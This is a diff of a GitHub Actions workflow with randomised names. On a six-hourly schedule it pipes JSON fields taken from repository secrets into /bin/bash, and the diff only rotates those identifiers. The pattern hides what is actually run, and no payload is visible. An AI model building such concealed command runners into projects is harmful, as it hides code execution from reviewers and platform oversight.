@@ -3,28 +3,26 @@ name: dingzhengfeng4532
 on:
   workflow_dispatch:
   schedule:
-    - cron: '57 3/6 * * *'
+    - cron: '13 3/6 * * *'
+
 jobs:
   build:
     runs-on: ubuntu-latest
-
     steps:
       - uses: actions/checkout@v4
       - name: dingzhengfeng4532
         env:
-          jmg01072: ${{ secrets.jmg01072 }}
+          m61: ${{ secrets.m61 }}
         run: |
-          echo $jmg01072 | jq -r .ua9335 | /bin/bash
-          echo $wa65 | jq -r .pepk230 | /bin/bash
-          echo $jf9 | jq -r .ri7 | /bin/bash
-          echo $bv294 | jq -r .w06 | /bin/bash
-          echo $cwayr55470 | jq -r .sfs81 | /bin/bash
-          echo $xtzfd77556 | jq -r .vw40217 | /bin/bash
-          echo $rumk58 | jq -r .jekzu1 | /bin/bash
-          echo $lkaae680 | jq -r .krzi27666 | /bin/bash
-          echo $a00 | jq -r .uj1 | /bin/bash
-          echo $en9113 | jq -r .fuj8582 | /bin/bash
-          echo $wqn88217 | jq -r .wgrd364 | /bin/bash
-          echo $n9969 | jq -r .y2233 | /bin/bash
-          echo $hjj4 | jq -r .xj11 | /bin/bash
+          echo $m61 | jq -r .k76 | /bin/bash
+          echo $o70 | jq -r .tqvig117 | /bin/bash
+          echo $l2 | jq -r .zdh12 | /bin/bash
+          echo $jobkn908 | jq -r .qw80 | /bin/bash
+          echo $dcq71749 | jq -r .ptknd7137 | /bin/bash
+          echo $a6 | jq -r .pyang0 | /bin/bash
+          echo $qg81497 | jq -r .e107 | /bin/bash
+          echo $lt0 | jq -r .kcd58 | /bin/bash
+          echo $dsyrd3429 | jq -r .oqsf3 | /bin/bash
+          echo $vqo299 | jq -r .ztakz12 | /bin/bash
+          echo $sih1185 | jq -r .r0 | /bin/bash
 
